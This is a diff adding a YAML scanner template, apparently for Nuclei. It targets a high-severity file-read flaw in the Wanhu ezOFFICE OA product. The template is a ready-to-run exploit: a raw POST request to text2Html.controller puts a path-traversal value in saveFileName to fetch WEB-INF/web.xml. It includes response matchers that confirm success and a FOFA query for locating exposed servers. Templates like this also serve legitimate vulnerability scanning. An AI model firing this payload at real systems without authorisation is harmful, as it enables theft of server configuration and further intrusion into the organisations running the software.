@@ -1,0 +1,34 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - contains(body, "java.sun.com")
+            - contains(body, "web-app")
+            - status_code == 200
+          type: dsl
+      raw:
+        - |-
+          POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
+          Content-Type: application/x-www-form-urlencoded
+          Accept-Encoding: gzip
+          SL-CE-SUID: 1081
+
+          saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
+id: wanhu-ezoffice-text2html-controller-fileread
+info:
+    author: wuha
+    description: 万户OA text2Html.controller文件读取漏洞
+    metadata:
+        fofa-query: app="万户网络-ezOFFICE"
+        max-request: 1
+        verified: true
+    name: 万户OA text2Html.controller文件读取漏洞
+    severity: high
+    tags:
+        - wanhu
+        - ezoffice
+        - fileread
+        - 万户oa
+        - 万户网络-ezOFFICE
